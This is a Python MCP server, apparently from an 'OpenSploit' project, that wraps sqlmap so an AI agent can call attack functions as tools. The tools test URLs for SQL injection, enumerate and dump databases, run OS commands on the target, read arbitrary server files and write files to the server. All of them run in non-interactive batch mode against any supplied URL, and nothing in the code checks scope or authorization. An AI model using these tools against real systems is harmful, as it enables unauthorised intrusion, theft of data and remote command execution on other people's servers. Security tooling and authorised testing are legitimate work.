#!/usr/bin/env python3
"""
OpenSploit MCP Server: sqlmap

Automatic SQL injection and database takeover tool.
"""

import asyncio
import json
import os
import re
import tempfile
from typing import Any, Dict, List, Optional

from mcp_common import BaseMCPServer, ToolResult, ToolError, sanitize_output


class SqlmapServer(BaseMCPServer):
    """MCP server wrapping sqlmap SQL injection tool."""

    def __init__(self):
        super().__init__(
            name="sqlmap",
            description="Automatic SQL injection and database takeover tool",
            version="1.0.0",
        )

        self.register_method(
            name="test_injection",
            description="Test a URL parameter for SQL injection vulnerabilities",
            params={
                "url": {
                    "type": "string",
                    "required": True,
                    "description": "Target URL with injectable parameter (use * to mark injection point)",
                },
                "data": {
                    "type": "string",
                    "description": "POST data (for POST requests)",
                },
                "cookie": {
                    "type": "string",
                    "description": "HTTP cookie header value",
                },
                "level": {
                    "type": "integer",
                    "default": 1,
                    "description": "Level of tests (1-5, higher = more tests)",
                },
                "risk": {
                    "type": "integer",
                    "default": 1,
                    "description": "Risk of tests (1-3, higher = more intrusive)",
                },
                "technique": {
                    "type": "string",
                    "default": "BEUSTQ",
                    "description": "SQL injection techniques: B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline",
                },
                "timeout": {
                    "type": "integer",
                    "default": 300,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.test_injection,
        )

        self.register_method(
            name="enumerate_dbs",
            description="Enumerate databases on a confirmed vulnerable target",
            params={
                "url": {
                    "type": "string",
                    "required": True,
                    "description": "Target URL (previously confirmed vulnerable)",
                },
                "data": {
                    "type": "string",
                    "description": "POST data if needed",
                },
                "cookie": {
                    "type": "string",
                    "description": "HTTP cookie header value",
                },
                "timeout": {
                    "type": "integer",
                    "default": 300,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.enumerate_dbs,
        )

        self.register_method(
            name="dump_table",
            description="Dump contents of a database table",
            params={
                "url": {
                    "type": "string",
                    "required": True,
                    "description": "Target URL",
                },
                "database": {
                    "type": "string",
                    "required": True,
                    "description": "Database name",
                },
                "table": {
                    "type": "string",
                    "required": True,
                    "description": "Table name",
                },
                "columns": {
                    "type": "string",
                    "description": "Specific columns to dump (comma-separated)",
                },
                "data": {
                    "type": "string",
                    "description": "POST data if needed",
                },
                "cookie": {
                    "type": "string",
                    "description": "HTTP cookie header value",
                },
                "limit": {
                    "type": "integer",
                    "default": 100,
                    "description": "Maximum rows to dump",
                },
                "timeout": {
                    "type": "integer",
                    "default": 600,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.dump_table,
        )

        self.register_method(
            name="dump_all",
            description="Dump all tables from a database",
            params={
                "url": {
                    "type": "string",
                    "required": True,
                    "description": "Target URL",
                },
                "database": {
                    "type": "string",
                    "required": True,
                    "description": "Database name to dump",
                },
                "data": {
                    "type": "string",
                    "description": "POST data if needed",
                },
                "cookie": {
                    "type": "string",
                    "description": "HTTP cookie header value",
                },
                "timeout": {
                    "type": "integer",
                    "default": 900,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.dump_all,
        )

        self.register_method(
            name="os_shell",
            description="Get an interactive OS shell via SQL injection (requires stacked queries or specific DBMS)",
            params={
                "url": {
                    "type": "string",
                    "required": True,
                    "description": "Target URL",
                },
                "command": {
                    "type": "string",
                    "required": True,
                    "description": "Command to execute",
                },
                "data": {
                    "type": "string",
                    "description": "POST data if needed",
                },
                "cookie": {
                    "type": "string",
                    "description": "HTTP cookie header value",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.os_shell,
        )

        self.register_method(
            name="file_read",
            description="Read a file from the target server via SQL injection",
            params={
                "url": {
                    "type": "string",
                    "required": True,
                    "description": "Target URL",
                },
                "file_path": {
                    "type": "string",
                    "required": True,
                    "description": "Absolute path to file on target server",
                },
                "data": {
                    "type": "string",
                    "description": "POST data if needed",
                },
                "cookie": {
                    "type": "string",
                    "description": "HTTP cookie header value",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.file_read,
        )

        self.register_method(
            name="file_write",
            description="Write a file to the target server via SQL injection",
            params={
                "url": {
                    "type": "string",
                    "required": True,
                    "description": "Target URL",
                },
                "local_file": {
                    "type": "string",
                    "required": True,
                    "description": "Local file path or content to write",
                },
                "remote_path": {
                    "type": "string",
                    "required": True,
                    "description": "Absolute path on target server",
                },
                "data": {
                    "type": "string",
                    "description": "POST data if needed",
                },
                "cookie": {
                    "type": "string",
                    "description": "HTTP cookie header value",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.file_write,
        )

    def _parse_sqlmap_output(self, output: str) -> Dict[str, Any]:
        """Parse sqlmap output for injection results."""
        result = {
            "vulnerable": False,
            "injection_type": None,
            "dbms": None,
            "parameters": [],
            "details": [],
        }

        lines = output.split("\n")

        for line in lines:
            # Check for vulnerability confirmation
            if "is vulnerable" in line.lower() or "parameter" in line.lower() and "injectable" in line.lower():
                result["vulnerable"] = True

            # Extract parameter info
            param_match = re.search(r"Parameter: (\S+)", line)
            if param_match:
                param = param_match.group(1)
                if param not in result["parameters"]:
                    result["parameters"].append(param)

            # Extract injection type
            if "Type:" in line:
                type_match = re.search(r"Type: (.+)", line)
                if type_match:
                    result["injection_type"] = type_match.group(1).strip()

            # Extract DBMS
            if "back-end DBMS:" in line.lower():
                dbms_match = re.search(r"back-end DBMS: (.+)", line, re.IGNORECASE)
                if dbms_match:
                    result["dbms"] = dbms_match.group(1).strip()

            # Collect relevant details
            if any(x in line.lower() for x in ["injectable", "payload", "technique", "dbms"]):
                if line.strip() and not line.startswith("["):
                    result["details"].append(line.strip())

        return result

    def _parse_databases(self, output: str) -> List[str]:
        """Parse sqlmap output for database names."""
        databases = []
        in_db_section = False

        for line in output.split("\n"):
            if "available databases" in line.lower():
                in_db_section = True
                continue

            if in_db_section:
                # Database names are listed with [*] prefix
                if line.strip().startswith("[*]"):
                    db = line.strip()[3:].strip()
                    if db:
                        databases.append(db)
                elif line.strip() and not line.startswith("["):
                    # Also catch plain database names
                    db = line.strip()
                    if db and not db.startswith("-"):
                        databases.append(db)

        return databases

    def _parse_table_dump(self, output: str) -> Dict[str, Any]:
        """Parse sqlmap table dump output."""
        result = {
            "columns": [],
            "rows": [],
            "row_count": 0,
        }

        lines = output.split("\n")
        in_table = False
        header_parsed = False

        for line in lines:
            line = line.strip()

            # Detect table start (line of dashes or plus signs)
            if re.match(r"^[\+\-]+$", line):
                in_table = True
                continue

            if in_table and line.startswith("|"):
                # Parse table row
                cells = [c.strip() for c in line.split("|")[1:-1]]

                if not header_parsed:
                    result["columns"] = cells
                    header_parsed = True
                else:
                    if cells and any(c for c in cells):
                        result["rows"].append(dict(zip(result["columns"], cells)))

        result["row_count"] = len(result["rows"])
        return result

    async def test_injection(
        self,
        url: str,
        data: Optional[str] = None,
        cookie: Optional[str] = None,
        level: int = 1,
        risk: int = 1,
        technique: str = "BEUSTQ",
        timeout: int = 300,
    ) -> ToolResult:
        """Test a URL parameter for SQL injection vulnerabilities."""
        self.logger.info(f"Testing SQL injection on {url}")

        args = [
            "sqlmap",
            "-u", url,
            "--batch",  # Non-interactive
            "--level", str(level),
            "--risk", str(risk),
            "--technique", technique,
            "--threads", "4",
        ]

        if data:
            args.extend(["--data", data])

        if cookie:
            args.extend(["--cookie", cookie])

        try:
            self.logger.info(f"Running: {' '.join(args)}")
            result = await self.run_command(args, timeout=timeout)

            output = result.stdout + result.stderr
            parsed = self._parse_sqlmap_output(output)

            parsed["summary"] = {
                "target": url,
                "level": level,
                "risk": risk,
                "vulnerable": parsed["vulnerable"],
            }

            return ToolResult(
                success=True,
                data=parsed,
                raw_output=sanitize_output(output),
            )

        except ToolError as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
            )

    async def enumerate_dbs(
        self,
        url: str,
        data: Optional[str] = None,
        cookie: Optional[str] = None,
        timeout: int = 300,
    ) -> ToolResult:
        """Enumerate databases on a confirmed vulnerable target."""
        self.logger.info(f"Enumerating databases on {url}")

        args = [
            "sqlmap",
            "-u", url,
            "--batch",
            "--dbs",  # Enumerate databases
            "--threads", "4",
        ]

        if data:
            args.extend(["--data", data])

        if cookie:
            args.extend(["--cookie", cookie])

        try:
            self.logger.info(f"Running: {' '.join(args)}")
            result = await self.run_command(args, timeout=timeout)

            output = result.stdout + result.stderr
            databases = self._parse_databases(output)

            return ToolResult(
                success=True,
                data={
                    "databases": databases,
                    "count": len(databases),
                    "target": url,
                },
                raw_output=sanitize_output(output),
            )

        except ToolError as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
            )

    async def dump_table(
        self,
        url: str,
        database: str,
        table: str,
        columns: Optional[str] = None,
        data: Optional[str] = None,
        cookie: Optional[str] = None,
        limit: int = 100,
        timeout: int = 600,
    ) -> ToolResult:
        """Dump contents of a database table."""
        self.logger.info(f"Dumping table {database}.{table} from {url}")

        args = [
            "sqlmap",
            "-u", url,
            "--batch",
            "-D", database,
            "-T", table,
            "--dump",
            "--threads", "4",
            "--dump-format", "CSV",
        ]

        if columns:
            args.extend(["-C", columns])

        if data:
            args.extend(["--data", data])

        if cookie:
            args.extend(["--cookie", cookie])

        if limit:
            args.extend(["--stop", str(limit)])

        try:
            self.logger.info(f"Running: {' '.join(args)}")
            result = await self.run_command(args, timeout=timeout)

            output = result.stdout + result.stderr
            parsed = self._parse_table_dump(output)

            parsed["database"] = database
            parsed["table"] = table
            parsed["target"] = url

            return ToolResult(
                success=True,
                data=parsed,
                raw_output=sanitize_output(output),
            )

        except ToolError as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
            )

    async def dump_all(
        self,
        url: str,
        database: str,
        data: Optional[str] = None,
        cookie: Optional[str] = None,
        timeout: int = 900,
    ) -> ToolResult:
        """Dump all tables from a database."""
        self.logger.info(f"Dumping all tables from {database} on {url}")

        args = [
            "sqlmap",
            "-u", url,
            "--batch",
            "-D", database,
            "--dump-all",
            "--threads", "4",
        ]

        if data:
            args.extend(["--data", data])

        if cookie:
            args.extend(["--cookie", cookie])

        try:
            self.logger.info(f"Running: {' '.join(args)}")
            result = await self.run_command(args, timeout=timeout)

            output = result.stdout + result.stderr

            return ToolResult(
                success=True,
                data={
                    "database": database,
                    "target": url,
                    "message": "Database dump completed. Check output for table contents.",
                },
                raw_output=sanitize_output(output),
            )

        except ToolError as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
            )

    async def os_shell(
        self,
        url: str,
        command: str,
        data: Optional[str] = None,
        cookie: Optional[str] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Execute an OS command via SQL injection."""
        self.logger.info(f"Executing OS command on {url}: {command}")

        args = [
            "sqlmap",
            "-u", url,
            "--batch",
            "--os-cmd", command,
        ]

        if data:
            args.extend(["--data", data])

        if cookie:
            args.extend(["--cookie", cookie])

        try:
            self.logger.info(f"Running: {' '.join(args)}")
            result = await self.run_command(args, timeout=timeout)

            output = result.stdout + result.stderr

            # Extract command output
            cmd_output = ""
            in_output = False
            for line in output.split("\n"):
                if "command standard output" in line.lower():
                    in_output = True
                    continue
                if in_output:
                    if line.startswith("[") or line.startswith("---"):
                        in_output = False
                    else:
                        cmd_output += line + "\n"

            return ToolResult(
                success=True,
                data={
                    "command": command,
                    "output": cmd_output.strip(),
                    "target": url,
                },
                raw_output=sanitize_output(output),
            )

        except ToolError as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
            )

    async def file_read(
        self,
        url: str,
        file_path: str,
        data: Optional[str] = None,
        cookie: Optional[str] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Read a file from the target server."""
        self.logger.info(f"Reading file {file_path} from {url}")

        args = [
            "sqlmap",
            "-u", url,
            "--batch",
            "--file-read", file_path,
        ]

        if data:
            args.extend(["--data", data])

        if cookie:
            args.extend(["--cookie", cookie])

        try:
            self.logger.info(f"Running: {' '.join(args)}")
            result = await self.run_command(args, timeout=timeout)

            output = result.stdout + result.stderr

            # Extract file content
            file_content = ""
            for line in output.split("\n"):
                if "file saved to" in line.lower():
                    # Find the local path where sqlmap saved the file
                    match = re.search(r"'([^']+)'", line)
                    if match:
                        local_path = match.group(1)
                        try:
                            with open(local_path, 'r') as f:
                                file_content = f.read()
                        except:
                            file_content = f"File saved to: {local_path}"

            return ToolResult(
                success=True,
                data={
                    "file_path": file_path,
                    "content": file_content,
                    "target": url,
                },
                raw_output=sanitize_output(output),
            )

        except ToolError as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
            )

    async def file_write(
        self,
        url: str,
        local_file: str,
        remote_path: str,
        data: Optional[str] = None,
        cookie: Optional[str] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Write a file to the target server."""
        self.logger.info(f"Writing file to {remote_path} on {url}")

        # If local_file is content (not a path), write to temp file
        if not os.path.exists(local_file):
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
                f.write(local_file)
                local_file = f.name

        args = [
            "sqlmap",
            "-u", url,
            "--batch",
            "--file-write", local_file,
            "--file-dest", remote_path,
        ]

        if data:
            args.extend(["--data", data])

        if cookie:
            args.extend(["--cookie", cookie])

        try:
            self.logger.info(f"Running: {' '.join(args)}")
            result = await self.run_command(args, timeout=timeout)

            output = result.stdout + result.stderr
            success = "file has been successfully written" in output.lower()

            return ToolResult(
                success=success,
                data={
                    "remote_path": remote_path,
                    "written": success,
                    "target": url,
                },
                raw_output=sanitize_output(output),
            )

        except ToolError as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
            )


if __name__ == "__main__":
    SqlmapServer.main()
